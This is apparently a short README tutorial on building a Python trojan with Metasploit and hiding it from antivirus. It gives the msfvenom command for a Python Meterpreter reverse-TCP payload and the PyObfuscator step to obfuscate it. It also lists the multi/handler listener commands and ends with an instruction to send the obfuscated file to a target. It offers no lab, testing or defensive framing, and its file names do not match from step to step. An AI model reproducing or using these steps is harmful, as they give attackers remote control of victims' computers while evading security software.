# Create python trojan with Metasploit and bypass all antiviruses

1 : install python and metasploit or using kali linux

2 : Next install requreiments

3 : create payload and obfuscation it and send to target 

4 : build up listener with metasploit

# Requreiments 

pip install PyObfuscator

Optional : if you want you can change it to exe file after obfuscation it for doing this read it (https://github.com/CharonDefalt/Bad-usb)

# Create payload

msfvenom -p python/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -o payload.py

After that lets obfuscation it with below command :

PyObfuscator payload_5050.py

# Build listener

use multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST YOURIP
set lport YOURPORT
run

# Final Part
now send this file ( payload_obfu.py ) to target


